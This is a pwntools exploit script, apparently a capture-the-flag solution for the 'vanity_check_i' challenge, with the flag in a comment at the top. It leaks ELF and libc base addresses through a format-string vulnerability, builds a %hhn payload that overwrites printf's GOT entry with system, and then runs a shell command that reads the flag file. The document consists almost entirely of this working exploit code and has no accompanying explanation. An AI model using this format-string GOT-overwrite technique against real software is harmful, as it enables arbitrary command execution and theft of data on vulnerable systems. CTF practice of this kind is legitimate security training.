# idek{ohhhh_s0_th3_c0mp1l3r_w4rn3d_m3_f0r_4_r34s0n...}
from pwn import *

elf = ELF("./vanity_check_i")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

target = elf.process()#([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
target = remote("vanity-check-i.idek.team", 1337)

def s(d):
    target.sendline(d)

target.recvlines(2)

s("%35$p.%41$p.")
elf.address = int(target.recvuntil(".", drop=True), 0x10) - elf.sym['__libc_csu_init']
log.info("ELF Base: " + hex(elf.address))
libc.address = int(target.recvuntil(".", drop=True), 0x10) - libc.sym['__libc_start_main'] - 243
log.info("LIBC Base: " + hex(libc.address))
log.info("LIBC Syst: " + hex(libc.sym['system']))

payload  = "%" + str(libc.sym['system'] & 0xff) + "c" + "%16$hhn"
payload += "%" + str(((libc.sym['system'] & 0xff00) >> 8) - libc.sym['system'] & 0xff) + "c" + "%17$hhn"
payload += "%" + str(0x100 + ((libc.sym['system'] & 0xff0000) >> 16) - ((libc.sym['system'] & 0xff00) >> 8))  + "c" + "%18$hhn"
payload += "\x00"*(10*8 - len(payload))
payload += p64(elf.got['printf']) + p64(elf.got['printf'] + 1) + p64(elf.got['printf'] + 2)
s(payload)

s("/bin/cat /flag.txt")

target.interactive()